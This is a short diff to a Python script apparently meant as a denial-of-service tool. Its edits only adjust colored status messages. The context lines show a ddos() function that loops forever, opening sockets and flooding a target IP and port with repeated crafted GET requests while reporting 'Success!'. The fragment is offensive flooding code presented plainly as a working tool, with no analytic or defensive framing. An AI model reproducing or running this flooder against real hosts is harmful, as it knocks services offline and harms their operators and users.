@@ -30,7 +30,7 @@ def ddos():
    
    
    message = (messages * rtxt)
-   print("\033[1;32;40mOk!\n")
+   print("\033[1;32;40m\nOk!")
    while True:
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
@@ -39,7 +39,7 @@ def ddos():
           mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
           print("\033[1;32;40mSuccess!\n")
       except socket.error:
-         print("\033[1;31;40mFailed Connection killed!, please wait....\n")
+         print("\033[1;31;40m\nFailed Connection killed!, please wait....\n")
          
          mysocket.close()
 
